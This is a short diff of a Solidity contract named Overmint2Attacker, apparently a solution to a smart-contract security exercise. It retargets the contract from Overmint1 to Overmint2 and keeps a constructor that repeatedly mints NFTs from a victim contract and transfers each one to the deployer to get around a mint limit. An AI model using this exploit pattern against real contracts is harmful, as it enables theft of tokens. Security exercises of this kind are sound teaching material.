@@ -1,14 +1,14 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity 0.8.15;
 
-import "../Overmint1.sol";
+import "../Overmint2.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract Overmint2Attacker is IERC721Receiver {
-    Overmint1 public victimContract;
+    Overmint2 public victimContract;
     uint recursionCount = 0;
     constructor(address _victimContract) {
-        victimContract = Overmint1(_victimContract);
+        victimContract = Overmint2(_victimContract);
         for (uint i = 1; i < 6; i++) {
             victimContract.mint();
             victimContract.safeTransferFrom(address(this), msg.sender, i);
